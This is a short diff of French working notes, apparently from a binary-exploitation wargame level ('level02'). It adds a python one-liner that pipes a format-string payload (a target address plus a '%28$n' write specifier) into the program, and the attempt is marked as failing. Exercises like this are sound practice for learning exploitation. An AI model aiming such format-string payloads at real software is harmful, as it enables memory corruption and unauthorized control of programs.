@@ -402,3 +402,9 @@ NOPE
 0x400d3a -> anything => check si peut modifier value avec %x + %\$n
 
 0x400d3a -> \x3a\x0d\x40\x00
+
+python -c "print '\x3a\x0d\x40\x00' + '%28\$n'" 
+
+python -c "print '\x3a\x0d\x40\x00' + '%28\$n'" | ./level02
+
+NOPE
